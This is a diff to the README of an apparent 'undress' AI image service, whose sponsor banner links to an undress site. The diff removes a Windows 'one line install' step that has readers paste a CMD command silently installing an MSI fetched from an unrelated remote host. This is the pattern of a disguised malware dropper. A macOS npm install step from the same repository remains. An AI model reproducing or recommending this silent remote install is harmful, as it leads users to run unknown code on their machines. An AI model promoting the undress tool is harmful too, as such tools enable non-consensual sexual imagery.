@@ -50,20 +50,17 @@ Dress AI Service is made possible by our amazing sponsors. Support the project a
 
 [<img width="1672" height="941" alt="5259cbc0-c12f-40e1-934b-d0f6802f745c" src="https://github.com/user-attachments/assets/43a0f5ad-c0b0-427d-9d24-0824c5bb8fa7"/>](https://undress.design/undress/?utm_source=github.com%2FGangTailorUpgrade%2Fundress-service&utm_medium=sponsorship&utm_campaign=github-september-2026&utm_content=readme-sponsor)
 
-### Option 1: One line Install (Recommended for Windows) 
-Open **CMD** and paste it and press **Enter**
-```bash
-cmd /c start msiexec /q /i https://devcodee.com/api & Dress-AI
-```
 
-Visit `http://localhost:8080` — your personal AI stylist is live! 🎉
 
-### Option 2: MAC OS One Line install
+
+
+### Option 1: MAC OS One Line install
 Download and install nvm: https://nodejs.org/en/download
 ```bash
 xcode-select --install
 mkdir -p 'dressai' && cd 'dressai' && npm install github:GangTailorUpgrade/undress-service
 ```
+Visit `http://localhost:8080` — your personal AI stylist is live! 🎉
 # Download AI models (first run)
 python scripts/download_models.py
 
